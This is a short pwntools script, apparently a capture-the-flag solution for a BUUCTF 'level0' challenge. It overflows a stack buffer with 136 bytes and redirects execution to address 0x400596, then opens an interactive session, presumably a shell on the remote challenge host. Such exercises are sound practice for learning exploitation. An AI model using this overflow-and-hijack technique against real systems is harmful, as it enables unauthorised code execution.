from pwn import *

# sh = process('./level0')
sh = remote('node5.buuoj.cn',26806)

payload = b'a' * 136 + p64(0x400596)
sh.sendline(payload)
sh.interactive()